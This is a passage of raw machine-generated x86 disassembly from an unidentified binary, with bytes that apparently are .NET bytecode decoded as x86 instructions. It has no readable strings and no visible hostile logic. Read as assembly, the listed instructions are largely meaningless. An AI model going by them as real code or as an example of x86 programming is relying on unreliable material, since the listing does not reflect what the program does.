  405253:	0a 13                	or     (%ebx),%dl
  405255:	0c 00                	or     $0x0,%al
  405257:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40525d:	00 00                	add    %al,(%eax)
  40525f:	00 7e 10             	add    %bh,0x10(%esi)
  405262:	00 00                	add    %al,(%eax)
  405264:	04 6f                	add    $0x6f,%al
  405266:	48                   	dec    %eax
  405267:	00 00                	add    %al,(%eax)
  405269:	0a 6f a5             	or     -0x5b(%edi),%ch
  40526c:	00 00                	add    %al,(%eax)
  40526e:	0a 7e 20             	or     0x20(%esi),%bh
  405271:	00 00                	add    %al,(%eax)
  405273:	04 72                	add    $0x72,%al
  405275:	c9                   	leave
  405276:	01 00                	add    %eax,(%eax)
  405278:	70 7e                	jo     0x4052f8
  40527a:	1f                   	pop    %ds
  40527b:	00 00                	add    %al,(%eax)
  40527d:	04 28                	add    $0x28,%al
  40527f:	43                   	inc    %ebx
  405280:	00 00                	add    %al,(%eax)
  405282:	0a 72 69             	or     0x69(%edx),%dh
  405285:	00 00                	add    %al,(%eax)
  405287:	70 6f                	jo     0x4052f8
  405289:	4f                   	dec    %edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	0a 28                	or     (%eax),%ch
  40528e:	0c 00                	or     $0x0,%al
  405290:	00 0a                	add    %cl,(%edx)
  405292:	72 b7                	jb     0x40524b
  405294:	0b 00                	or     (%eax),%eax
  405296:	70 7e                	jo     0x405316
  405298:	19 00                	sbb    %eax,(%eax)
  40529a:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40529d:	91                   	xchg   %eax,%ecx
  40529e:	00 00                	add    %al,(%eax)
  4052a0:	0a 72 bb             	or     -0x45(%edx),%dh
  4052a3:	0b 00                	or     (%eax),%eax
  4052a5:	70 28                	jo     0x4052cf
  4052a7:	43                   	inc    %ebx
  4052a8:	00 00                	add    %al,(%eax)
  4052aa:	0a 16                	or     (%esi),%dl
  4052ac:	28 bc 00 00 0a 13 12 	sub    %bh,0x12130a00(%eax,%eax,1)
  4052b3:	11 12                	adc    %edx,(%edx)
  4052b5:	2c 3e                	sub    $0x3e,%al
  4052b7:	7e 10                	jle    0x4052c9
  4052b9:	00 00                	add    %al,(%eax)
  4052bb:	04 6f                	add    $0x6f,%al
  4052bd:	48                   	dec    %eax
  4052be:	00 00                	add    %al,(%eax)
  4052c0:	0a 6f a5             	or     -0x5b(%edi),%ch
  4052c3:	00 00                	add    %al,(%eax)
  4052c5:	0a 7e 20             	or     0x20(%esi),%bh
  4052c8:	00 00                	add    %al,(%eax)
  4052ca:	04 17                	add    $0x17,%al
  4052cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4052cd:	4b                   	dec    %ebx
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	0a 7e 1f             	or     0x1f(%esi),%bh
  4052d3:	00 00                	add    %al,(%eax)
  4052d5:	04 72                	add    $0x72,%al
  4052d7:	b7 0b                	mov    $0xb,%bh
  4052d9:	00 70 7e             	add    %dh,0x7e(%eax)
  4052dc:	19 00                	sbb    %eax,(%eax)
  4052de:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4052e1:	91                   	xchg   %eax,%ecx
  4052e2:	00 00                	add    %al,(%eax)
  4052e4:	0a 72 bb             	or     -0x45(%edx),%dh
  4052e7:	0b 00                	or     (%eax),%eax
  4052e9:	70 28                	jo     0x405313
  4052eb:	43                   	inc    %ebx
  4052ec:	00 00                	add    %al,(%eax)
  4052ee:	0a 6f 54             	or     0x54(%edi),%ch
  4052f1:	00 00                	add    %al,(%eax)
  4052f3:	0a 00                	or     (%eax),%al
  4052f5:	00 de                	add    %bl,%dh
  4052f7:	10 25 28 2c 00 00    	adc    %ah,0x2c28
  4052fd:	0a 13                	or     (%ebx),%dl
  4052ff:	0d 00 28 2d 00       	or     $0x2d2800,%eax
  405304:	00 0a                	add    %cl,(%edx)
  405306:	de 00                	fiadds (%eax)
  405308:	00 00                	add    %al,(%eax)
  40530a:	de 10                	ficoms (%eax)
  40530c:	25 28 2c 00 00       	and    $0x2c28,%eax
  405311:	0a 13                	or     (%ebx),%dl
  405313:	0e                   	push   %cs
  405314:	00 28                	add    %ch,(%eax)
  405316:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  40531b:	00 00                	add    %al,(%eax)
  40531d:	00 17                	add    %dl,(%edi)
  40531f:	13 12                	adc    (%edx),%edx
  405321:	11 12                	adc    %edx,(%edx)
  405323:	3a d9                	cmp    %cl,%bl
  405325:	fd                   	std
  405326:	ff                   	(bad)
  405327:	ff 00                	incl   (%eax)
  405329:	2a 00                	sub    (%eax),%al
  40532b:	00 41 ac             	add    %al,-0x54(%ecx)
  40532e:	00 00                	add    %al,(%eax)
  405330:	00 00                	add    %al,(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	13 00                	adc    (%eax),%eax
  405336:	00 00                	add    %al,(%eax)
  405338:	21 00                	and    %eax,(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	34 00                	xor    $0x0,%al
  40533e:	00 00                	add    %al,(%eax)
  405340:	10 00                	adc    %al,(%eax)
  405342:	00 00                	add    %al,(%eax)
  405344:	20 00                	and    %al,(%eax)
  405346:	00 01                	add    %al,(%ecx)
  405348:	00 00                	add    %al,(%eax)
  40534a:	00 00                	add    %al,(%eax)
  40534c:	c9                   	leave
  40534d:	00 00                	add    %al,(%eax)
  40534f:	00 2d 00 00 00 f6    	add    %ch,0xf6000000
  405355:	00 00                	add    %al,(%eax)
  405357:	00 10                	add    %dl,(%eax)
  405359:	00 00                	add    %al,(%eax)
  40535b:	00 20                	add    %ah,(%eax)
  40535d:	00 00                	add    %al,(%eax)
  40535f:	01 00                	add    %eax,(%eax)
  405361:	00 00                	add    %al,(%eax)
  405363:	00 4b 01             	add    %cl,0x1(%ebx)
  405366:	00 00                	add    %al,(%eax)
  405368:	1b 00                	sbb    (%eax),%eax
  40536a:	00 00                	add    %al,(%eax)
  40536c:	66 01 00             	add    %ax,(%eax)
  40536f:	00 10                	add    %dl,(%eax)
  405371:	00 00                	add    %al,(%eax)
  405373:	00 20                	add    %ah,(%eax)
  405375:	00 00                	add    %al,(%eax)
  405377:	01 00                	add    %eax,(%eax)
  405379:	00 00                	add    %al,(%eax)
  40537b:	00 b3 01 00 00 17    	add    %dh,0x17000001(%ebx)
  405381:	00 00                	add    %al,(%eax)
  405383:	00 ca                	add    %cl,%dl
  405385:	01 00                	add    %eax,(%eax)
  405387:	00 10                	add    %dl,(%eax)
  405389:	00 00                	add    %al,(%eax)
  40538b:	00 20                	add    %ah,(%eax)
  40538d:	00 00                	add    %al,(%eax)
  40538f:	01 00                	add    %eax,(%eax)
  405391:	00 00                	add    %al,(%eax)
  405393:	00 32                	add    %dh,(%edx)
  405395:	02 00                	add    (%eax),%al
  405397:	00 98 00 00 00 ca    	add    %bl,-0x36000000(%eax)
  40539d:	02 00                	add    (%eax),%al
  40539f:	00 10                	add    %dl,(%eax)
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	00 20                	add    %ah,(%eax)
  4053a5:	00 00                	add    %al,(%eax)
  4053a7:	01 00                	add    %eax,(%eax)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 dc                	add    %bl,%ah
  4053ad:	02 00                	add    (%eax),%al
  4053af:	00 98 00 00 00 74    	add    %bl,0x74000000(%eax)
  4053b5:	03 00                	add    (%eax),%eax
  4053b7:	00 10                	add    %dl,(%eax)
  4053b9:	00 00                	add    %al,(%eax)
  4053bb:	00 20                	add    %ah,(%eax)
  4053bd:	00 00                	add    %al,(%eax)
  4053bf:	01 00                	add    %eax,(%eax)
  4053c1:	00 00                	add    %al,(%eax)
  4053c3:	00 a4 01 00 00 e4 01 	add    %ah,0x1e40000(%ecx,%eax,1)
  4053ca:	00 00                	add    %al,(%eax)
  4053cc:	88 03                	mov    %al,(%ebx)
  4053ce:	00 00                	add    %al,(%eax)
  4053d0:	10 00                	adc    %al,(%eax)
  4053d2:	00 00                	add    %al,(%eax)
  4053d4:	20 00                	and    %al,(%eax)
  4053d6:	00 01                	add    %al,(%ecx)
  4053d8:	13 30                	adc    (%eax),%esi
  4053da:	03 00                	add    (%eax),%eax
  4053dc:	49                   	dec    %ecx
  4053dd:	00 00                	add    %al,(%eax)
  4053df:	00 1a                	add    %bl,(%edx)
  4053e1:	00 00                	add    %al,(%eax)
  4053e3:	11 00                	adc    %eax,(%eax)
  4053e5:	73 bd                	jae    0x4053a4
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	0a 02                	or     (%edx),%al
  4053eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ec:	be 00 00 0a 10       	mov    $0x100a0000,%esi
  4053f1:	00 72 69             	add    %dh,0x69(%edx)
  4053f4:	00 00                	add    %al,(%eax)
  4053f6:	70 0d                	jo     0x405405
  4053f8:	02 0a                	add    (%edx),%cl
  4053fa:	16                   	push   %ss
  4053fb:	0c 2b                	or     $0x2b,%al
  4053fd:	1d 06 08 91 13       	sbb    $0x13910806,%eax
  405402:	04 09                	add    $0x9,%al
  405404:	12 04 72             	adc    (%edx,%esi,2),%al
  405407:	49                   	dec    %ecx
  405408:	0c 00                	or     $0x0,%al
  40540a:	70 28                	jo     0x405434
  40540c:	bf 00 00 0a 28       	mov    $0x280a0000,%edi
  405411:	4a                   	dec    %edx
  405412:	00 00                	add    %al,(%eax)
  405414:	0a 0d 08 17 d6 0c    	or     0xcd61708,%cl
  40541a:	00 08                	add    %cl,(%eax)
  40541c:	06                   	push   %es
  40541d:	8e b7 fe 04 13 05    	mov    0x51304fe(%edi),%?
  405423:	11 05 2d d7 09 0b    	adc    %eax,0xb09d72d
  405429:	2b 00                	sub    (%eax),%eax
  40542b:	07                   	pop    %es
  40542c:	2a 00                	sub    (%eax),%al
  40542e:	00 00                	add    %al,(%eax)
  405430:	13 30                	adc    (%eax),%esi
  405432:	03 00                	add    (%eax),%eax
  405434:	90                   	nop
  405435:	00 00                	add    %al,(%eax)
  405437:	00 1b                	add    %bl,(%ebx)
  405439:	00 00                	add    %al,(%eax)
  40543b:	11 00                	adc    %eax,(%eax)
  40543d:	02 28                	add    (%eax),%ch
  40543f:	c0 00 00             	rolb   $0x0,(%eax)
  405442:	0a 6f c1             	or     -0x3f(%edi),%ch
  405445:	00 00                	add    %al,(%eax)
  405447:	0a 0a                	or     (%edx),%cl
  405449:	16                   	push   %ss
  40544a:	06                   	push   %es
  40544b:	8e b7 17 da 13 07    	mov    0x713da17(%edi),%?
  405451:	0c 2b                	or     $0x2b,%al
  405453:	69 06 08 9a 0d 09    	imul   $0x90d9a08,(%esi),%eax
  405459:	6f                   	outsl  %ds:(%esi),(%dx)
  40545a:	c2 00 00             	ret    $0x0
  40545d:	0a 13                	or     (%ebx),%dl
  40545f:	04 16                	add    $0x16,%al
  405461:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405464:	b7 17                	mov    $0x17,%bh
  405466:	da 13                	ficoml (%ebx)
  405468:	08 13                	or     %dl,(%ebx)
  40546a:	05 2b 41 11 04       	add    $0x411412b,%eax
  40546f:	11 05 9a 13 06 11    	adc    %eax,0x1106139a
  405475:	06                   	push   %es
  405476:	6f                   	outsl  %ds:(%esi),(%dx)
  405477:	c3                   	ret
  405478:	00 00                	add    %al,(%eax)
  40547a:	0a 72 8b             	or     -0x75(%edx),%dh
  40547d:	09 00                	or     %eax,(%eax)
  40547f:	70 03                	jo     0x405484
  405481:	28 4a 00             	sub    %cl,0x0(%edx)
  405484:	00 0a                	add    %cl,(%edx)
  405486:	6f                   	outsl  %ds:(%esi),(%dx)
  405487:	c4 00                	les    (%eax),%eax
  405489:	00 0a                	add    %cl,(%edx)
  40548b:	13 09                	adc    (%ecx),%ecx
  40548d:	11 09                	adc    %ecx,(%ecx)
  40548f:	2c 15                	sub    $0x15,%al
  405491:	09 6f c5             	or     %ebp,-0x3b(%edi)
  405494:	00 00                	add    %al,(%eax)
  405496:	0a 11                	or     (%ecx),%dl
  405498:	06                   	push   %es
  405499:	6f                   	outsl  %ds:(%esi),(%dx)
  40549a:	c3                   	ret
  40549b:	00 00                	add    %al,(%eax)
  40549d:	0a 6f c6             	or     -0x3a(%edi),%ch
  4054a0:	00 00                	add    %al,(%eax)
  4054a2:	0a 0b                	or     (%ebx),%cl
  4054a4:	2b 24 00             	sub    (%eax,%eax,1),%esp
  4054a7:	00 11                	add    %dl,(%ecx)
  4054a9:	05 17 d6 13 05       	add    $0x513d617,%eax
  4054ae:	11 05 11 08 13 0a    	adc    %eax,0xa130811
  4054b4:	11 0a                	adc    %ecx,(%edx)
  4054b6:	31 b5 00 08 17 d6    	xor    %esi,-0x29e8f800(%ebp)
  4054bc:	0c 08                	or     $0x8,%al
  4054be:	11 07                	adc    %eax,(%edi)
  4054c0:	13 0a                	adc    (%edx),%ecx
  4054c2:	11 0a                	adc    %ecx,(%edx)
  4054c4:	31 8e 14 0b 2b 00    	xor    %ecx,0x2b0b14(%esi)
  4054ca:	07                   	pop    %es
  4054cb:	2a 1b                	sub    (%ebx),%bl
  4054cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4054d0:	2b 00                	sub    (%eax),%eax
  4054d2:	00 00                	add    %al,(%eax)
  4054d4:	11 00                	adc    %eax,(%eax)
  4054d6:	00 11                	add    %dl,(%ecx)
  4054d8:	00 00                	add    %al,(%eax)
  4054da:	28 b9 00 00 0a 6f    	sub    %bh,0x6f0a0000(%ecx)
  4054e0:	c7 00 00 0a 1f 1d    	movl   $0x1d1f0a00,(%eax)
  4054e6:	0f 00 1a             	ltr    (%edx)
  4054e9:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4054ec:	00 06                	add    %al,(%esi)
  4054ee:	26 de 0f             	fimuls %es:(%edi)
  4054f1:	25 28 2c 00 00       	and    $0x2c28,%eax
  4054f6:	0a 0a                	or     (%edx),%cl
  4054f8:	00 28                	add    %ch,(%eax)
  4054fa:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4054ff:	00 00                	add    %al,(%eax)
  405501:	00 2a                	add    %ch,(%edx)
  405503:	00 01                	add    %al,(%ecx)
  405505:	10 00                	adc    %al,(%eax)
  405507:	00 00                	add    %al,(%eax)
  405509:	00 02                	add    %al,(%edx)
  40550b:	00 17                	add    %dl,(%edi)
  40550d:	19 00                	sbb    %eax,(%eax)
  40550f:	0f 20 00             	mov    %cr0,%eax
  405512:	00 01                	add    %al,(%ecx)
  405514:	1b 30                	sbb    (%eax),%esi
  405516:	08 00                	or     %al,(%eax)
  405518:	c2 02 00             	ret    $0x2
  40551b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40551e:	00 11                	add    %dl,(%ecx)
  405520:	00 00                	add    %al,(%eax)
  405522:	00 72 69             	add    %dh,0x69(%edx)
  405525:	00 00                	add    %al,(%eax)
  405527:	70 80                	jo     0x4054a9
  405529:	18 00                	sbb    %al,(%eax)
  40552b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40552e:	0c 00                	or     $0x0,%al
  405530:	00 04 14             	add    %al,(%esp,%edx,1)
  405533:	fe 01                	incb   (%ecx)
  405535:	16                   	push   %ss
  405536:	fe 01                	incb   (%ecx)
  405538:	13 0b                	adc    (%ebx),%ecx
  40553a:	11 0b                	adc    %ecx,(%ebx)
  40553c:	39 2e                	cmp    %ebp,(%esi)
  40553e:	02 00                	add    (%eax),%al
  405540:	00 15 6a 0a 16 0b    	add    %dl,0xb160a6a
  405546:	00 00                	add    %al,(%eax)
  405548:	00 07                	add    %al,(%edi)
  40554a:	17                   	pop    %ss
  40554b:	d6                   	salc
  40554c:	0b 07                	or     (%edi),%eax
  40554e:	1f                   	pop    %ds
  40554f:	0a fe                	or     %dh,%bh
  405551:	01 13                	add    %edx,(%ebx)
  405553:	0b 11                	or     (%ecx),%edx
  405555:	0b 2c 09             	or     (%ecx,%ecx,1),%ebp
  405558:	16                   	push   %ss
  405559:	0b 17                	or     (%edi),%edx
  40555b:	28 36                	sub    %dh,(%esi)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	0a 00                	or     (%eax),%al
  405561:	00 7e 0d             	add    %bh,0xd(%esi)
  405564:	00 00                	add    %al,(%eax)
  405566:	04 16                	add    $0x16,%al
  405568:	fe 01                	incb   (%ecx)
  40556a:	13 0b                	adc    (%ebx),%ecx
  40556c:	11 0b                	adc    %ecx,(%ebx)
  40556e:	2c 06                	sub    $0x6,%al
  405570:	00 dd                	add    %bl,%ch
  405572:	fb                   	sti
  405573:	01 00                	add    %eax,(%eax)
  405575:	00 00                	add    %al,(%eax)
  405577:	7e 0c                	jle    0x405585
  405579:	00 00                	add    %al,(%eax)
  40557b:	04 6f                	add    $0x6f,%al
  40557d:	c8 00 00 0a          	enter  $0x0,$0xa
  405581:	17                   	pop    %ss
  405582:	fe 04 13             	incb   (%ebx,%edx,1)
  405585:	0b 11                	or     (%ecx),%edx
  405587:	0b 2c 12             	or     (%edx,%edx,1),%ebp
  40558a:	7e 0c                	jle    0x405598
  40558c:	00 00                	add    %al,(%eax)
  40558e:	04 6f                	add    $0x6f,%al
  405590:	3d 00 00 0a 15       	cmp    $0x150a0000,%eax
  405595:	16                   	push   %ss
  405596:	6f                   	outsl  %ds:(%esi),(%dx)
  405597:	c9                   	leave
  405598:	00 00                	add    %al,(%eax)
  40559a:	0a 26                	or     (%esi),%ah
  40559c:	00 00                	add    %al,(%eax)
  40559e:	00 7e 0c             	add    %bh,0xc(%esi)
  4055a1:	00 00                	add    %al,(%eax)
  4055a3:	04 6f                	add    $0x6f,%al
  4055a5:	c8 00 00 0a          	enter  $0x0,$0xa
  4055a9:	16                   	push   %ss
  4055aa:	fe 02                	incb   (%edx)
  4055ac:	13 0b                	adc    (%ebx),%ecx
  4055ae:	11 0b                	adc    %ecx,(%ebx)
  4055b0:	39 a6 01 00 00 06    	cmp    %esp,0x6000001(%esi)
  4055b6:	15 6a fe 01 13       	adc    $0x1301fe6a,%eax
  4055bb:	0c 11                	or     $0x11,%al
  4055bd:	0c 39                	or     $0x39,%al
  4055bf:	b8 00 00 00 72       	mov    $0x72000000,%eax
  4055c4:	69 00 00 70 13 04    	imul   $0x4137000,(%eax),%eax
  4055ca:	38 a2 00 00 00 7e    	cmp    %ah,0x7e000000(%edx)
  4055d0:	0c 00                	or     $0x0,%al
  4055d2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4055d5:	ca 00 00             	lret   $0x0
  4055d8:	0a 6f cb             	or     -0x35(%edi),%ch
  4055db:	00 00                	add    %al,(%eax)
  4055dd:	0a 13                	or     (%ebx),%dl
  4055df:	05 00 11 05 15       	add    $0x15051100,%eax
  4055e4:	59                   	pop    %ecx
  4055e5:	13 0d 11 0d 45 02    	adc    0x2450d11,%ecx
  4055eb:	00 00                	add    %al,(%eax)
  4055ed:	00 02                	add    %al,(%edx)
  4055ef:	00 00                	add    %al,(%eax)
  4055f1:	00 0b                	add    %cl,(%ebx)
  4055f3:	00 00                	add    %al,(%eax)
  4055f5:	00 2b                	add    %ch,(%ebx)
  4055f7:	54                   	push   %esp
  4055f8:	00 00                	add    %al,(%eax)
  4055fa:	dd 72 01             	fnsave 0x1(%edx)
  4055fd:	00 00                	add    %al,(%eax)
  4055ff:	2b 4b 00             	sub    0x0(%ebx),%ecx
  405602:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  405605:	cc                   	int3
  405606:	00 00                	add    %al,(%eax)
  405608:	0a 0a                	or     (%edx),%cl
  40560a:	72 69                	jb     0x405675
  40560c:	00 00                	add    %al,(%eax)
  40560e:	70 13                	jo     0x405623
  405610:	04 06                	add    $0x6,%al
  405612:	16                   	push   %ss
  405613:	6a fe                	push   $0xfffffffe
  405615:	01 13                	add    %edx,(%ebx)
  405617:	0c 11                	or     $0x11,%al
  405619:	0c 2c                	or     $0x2c,%al
  40561b:	0e                   	push   %cs
  40561c:	72 69                	jb     0x405687
  40561e:	00 00                	add    %al,(%eax)
  405620:	70 28                	jo     0x40564a
  405622:	39 00                	cmp    %eax,(%eax)
  405624:	00 06                	add    %al,(%esi)
  405626:	26 15 6a 0a 00 7e    	es adc $0x7e000a6a,%eax
  40562c:	0c 00                	or     $0x0,%al
  40562e:	00 04 6f             	add    %al,(%edi,%ebp,2)
  405631:	c8 00 00 0a          	enter  $0x0,$0xa
  405635:	16                   	push   %ss
  405636:	fe 02                	incb   (%edx)
  405638:	16                   	push   %ss
  405639:	fe 01                	incb   (%ecx)
  40563b:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  40563e:	0c 2c                	or     $0x2c,%al
  405640:	05 38 02 ff ff       	add    $0xffff0238,%eax
  405645:	ff 00                	incl   (%eax)
  405647:	38 52 ff             	cmp    %dl,-0x1(%edx)
  40564a:	ff                   	(bad)
  40564b:	ff 00                	incl   (%eax)
  40564d:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  405650:	05 28 cd 00 00       	add    $0xcd28,%eax
  405655:	0a 13                	or     (%ebx),%dl
  405657:	0a 12                	or     (%edx),%dl
  405659:	0a 28                	or     (%eax),%ch
  40565b:	ce                   	into
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 28                	or     (%eax),%ch
  405660:	40                   	inc    %eax
  405661:	00 00                	add    %al,(%eax)
  405663:	0a 28                	or     (%eax),%ch
  405665:	74 00                	je     0x405667
  405667:	00 0a                	add    %cl,(%edx)
  405669:	28 4a 00             	sub    %cl,0x0(%edx)
  40566c:	00 0a                	add    %cl,(%edx)
  40566e:	13 04 00             	adc    (%eax,%eax,1),%eax
  405671:	17                   	pop    %ss
  405672:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  405675:	0c 3a                	or     $0x3a,%al
  405677:	54                   	push   %esp
  405678:	ff                   	(bad)
  405679:	ff                   	(bad)
  40567a:	ff 00                	incl   (%eax)
  40567c:	7e 0c                	jle    0x40568a
  40567e:	00 00                	add    %al,(%eax)
  405680:	04 6f                	add    $0x6f,%al
  405682:	c8 00 00 0a          	enter  $0x0,$0xa
  405686:	17                   	pop    %ss
  405687:	d6                   	salc
  405688:	17                   	pop    %ss
  405689:	da 17                	ficoml (%edi)
  40568b:	d6                   	salc
  40568c:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  40568f:	00 01                	add    %al,(%ecx)
  405691:	80 0a 00             	orb    $0x0,(%edx)
  405694:	00 04 06             	add    %al,(%esi,%eax,1)
  405697:	7e 1a                	jle    0x4056b3
  405699:	00 00                	add    %al,(%eax)
  40569b:	04 6f                	add    $0x6f,%al
  40569d:	8d 00                	lea    (%eax),%eax
  40569f:	00 0a                	add    %cl,(%edx)
  4056a1:	da 0d 7e 0a 00 00    	fimull 0xa7e
  4056a7:	04 8e                	add    $0x8e,%al
  4056a9:	b7 6a                	mov    $0x6a,%bh
  4056ab:	09 fe                	or     %edi,%esi
  4056ad:	02 13                	add    (%ebx),%dl
  4056af:	0c 11                	or     $0x11,%al
  4056b1:	0c 2c                	or     $0x2c,%al
  4056b3:	15 09 17 6a da       	adc    $0xda6a1709,%eax
  4056b8:	b7 17                	mov    $0x17,%bh
  4056ba:	d6                   	salc
  4056bb:	17                   	pop    %ss
  4056bc:	da 17                	ficoml (%edi)
  4056be:	d6                   	salc
  4056bf:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  4056c2:	00 01                	add    %al,(%ecx)
  4056c4:	80 0a 00             	orb    $0x0,(%edx)
  4056c7:	00 04 00             	add    %al,(%eax,%eax,1)
  4056ca:	7e 0c                	jle    0x4056d8
  4056cc:	00 00                	add    %al,(%eax)
  4056ce:	04 6f                	add    $0x6f,%al
  4056d0:	3d 00 00 0a 7e       	cmp    $0x7e0a0000,%eax
  4056d5:	0a 00                	or     (%eax),%al
  4056d7:	00 04 16             	add    %al,(%esi,%edx,1)
  4056da:	7e 0a                	jle    0x4056e6
  4056dc:	00 00                	add    %al,(%eax)
  4056de:	04 8e                	add    $0x8e,%al
  4056e0:	b7 16                	mov    $0x16,%bh
  4056e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4056e3:	cf                   	iret
  4056e4:	00 00                	add    %al,(%eax)
  4056e6:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  4056e9:	1a 00                	sbb    (%eax),%al
  4056eb:	00 04 7e             	add    %al,(%esi,%edi,2)
  4056ee:	0a 00                	or     (%eax),%al
  4056f0:	00 04 16             	add    %al,(%esi,%edx,1)
  4056f3:	08 6f 6f             	or     %ch,0x6f(%edi)
  4056f6:	00 00                	add    %al,(%eax)
  4056f8:	0a 00                	or     (%eax),%al
  4056fa:	7e 1a                	jle    0x405716
  4056fc:	00 00                	add    %al,(%eax)
  4056fe:	04 6f                	add    $0x6f,%al
  405700:	8d 00                	lea    (%eax),%eax
  405702:	00 0a                	add    %cl,(%edx)
  405704:	06                   	push   %es
  405705:	fe 01                	incb   (%ecx)
  405707:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  40570a:	0c 2c                	or     $0x2c,%al
  40570c:	48                   	dec    %eax
  40570d:	15 6a 0a 14 fe       	adc    $0xfe140a6a,%eax
  405712:	06                   	push   %es
  405713:	15 00 00 06 73       	adc    $0x73060000,%eax
  405718:	d0 00                	rolb   $1,(%eax)
  40571a:	00 0a                	add    %cl,(%edx)
  40571c:	17                   	pop    %ss
  40571d:	73 d1                	jae    0x4056f0
  40571f:	00 00                	add    %al,(%eax)
  405721:	0a 13                	or     (%ebx),%dl
  405723:	06                   	push   %es
  405724:	11 06                	adc    %eax,(%esi)
  405726:	7e 1a                	jle    0x405742
  405728:	00 00                	add    %al,(%eax)
  40572a:	04 6f                	add    $0x6f,%al
  40572c:	70 00                	jo     0x40572e
  40572e:	00 0a                	add    %cl,(%edx)
  405730:	6f                   	outsl  %ds:(%esi),(%dx)
  405731:	d2 00                	rolb   %cl,(%eax)
  405733:	00 0a                	add    %cl,(%edx)
  405735:	00 11                	add    %dl,(%ecx)
  405737:	06                   	push   %es
  405738:	1f                   	pop    %ds
  405739:	64 6f                	outsl  %fs:(%esi),(%dx)
  40573b:	d3 00                	roll   %cl,(%eax)
  40573d:	00 0a                	add    %cl,(%edx)
  40573f:	26 7e 1a             	es jle 0x40575c
  405742:	00 00                	add    %al,(%eax)
  405744:	04 6f                	add    $0x6f,%al
  405746:	39 00                	cmp    %eax,(%eax)
  405748:	00 0a                	add    %cl,(%edx)
  40574a:	00 73 26             	add    %dh,0x26(%ebx)
  40574d:	00 00                	add    %al,(%eax)
  40574f:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  405755:	00 38                	add    %bh,(%eax)
  405757:	ed                   	in     (%dx),%eax
  405758:	fd                   	std
  405759:	ff                   	(bad)
  40575a:	ff 00                	incl   (%eax)
  40575c:	de 10                	ficoms (%eax)
  40575e:	25 28 2c 00 00       	and    $0x2c28,%eax
  405763:	0a 13                	or     (%ebx),%dl
  405765:	07                   	pop    %es
  405766:	00 28                	add    %ch,(%eax)
  405768:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  40576d:	00 00                	add    %al,(%eax)
  40576f:	00 00                	add    %al,(%eax)
  405771:	00 00                	add    %al,(%eax)
  405773:	7e 1e                	jle    0x405793
  405775:	00 00                	add    %al,(%eax)
  405777:	04 14                	add    $0x14,%al
  405779:	fe 01                	incb   (%ecx)
  40577b:	16                   	push   %ss
  40577c:	fe 01                	incb   (%ecx)
  40577e:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  405781:	0c 2c                	or     $0x2c,%al
  405783:	26 7e 1e             	es jle 0x4057a4
  405786:	00 00                	add    %al,(%eax)
  405788:	04 28                	add    $0x28,%al
  40578a:	0c 00                	or     $0x0,%al
  40578c:	00 0a                	add    %cl,(%edx)
  40578e:	14 72                	adc    $0x72,%al
  405790:	4f                   	dec    %edi
  405791:	0c 00                	or     $0x0,%al
  405793:	70 16                	jo     0x4057ab
  405795:	8d 0a                	lea    (%edx),%ecx
  405797:	00 00                	add    %al,(%eax)
  405799:	01 14 14             	add    %edx,(%esp,%edx,1)
  40579c:	14 17                	adc    $0x17,%al
  40579e:	28 41 00             	sub    %al,0x0(%ecx)
  4057a1:	00 0a                	add    %cl,(%edx)
  4057a3:	26 14 80             	es adc $0x80,%al
  4057a6:	1e                   	push   %ds
  4057a7:	00 00                	add    %al,(%eax)
  4057a9:	04 00                	add    $0x0,%al
  4057ab:	de 10                	ficoms (%eax)
  4057ad:	25 28 2c 00 00       	and    $0x2c28,%eax
  4057b2:	0a 13                	or     (%ebx),%dl
  4057b4:	08 00                	or     %al,(%eax)
  4057b6:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4057bc:	00 00                	add    %al,(%eax)
  4057be:	16                   	push   %ss
  4057bf:	80 0d 00 00 04 28 20 	orb    $0x20,0x28040000
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	06                   	push   %es
  4057c9:	16                   	push   %ss
  4057ca:	fe 01                	incb   (%ecx)
  4057cc:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4057cf:	0c 2c                	or     $0x2c,%al
  4057d1:	02 2b                	add    (%ebx),%ch
  4057d3:	9d                   	popf
  4057d4:	00 17                	add    %dl,(%edi)
  4057d6:	80 0d 00 00 04 38 42 	orb    $0x42,0x38040000
  4057dd:	fd                   	std
  4057de:	ff                   	(bad)
  4057df:	ff 00                	incl   (%eax)
  4057e1:	2a 00                	sub    (%eax),%al
  4057e3:	00 41 34             	add    %al,0x34(%ecx)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	00 00                	add    %al,(%eax)
  4057ea:	00 00                	add    %al,(%eax)
  4057ec:	27                   	daa
  4057ed:	00 00                	add    %al,(%eax)
  4057ef:	00 17                	add    %dl,(%edi)
  4057f1:	02 00                	add    (%eax),%al
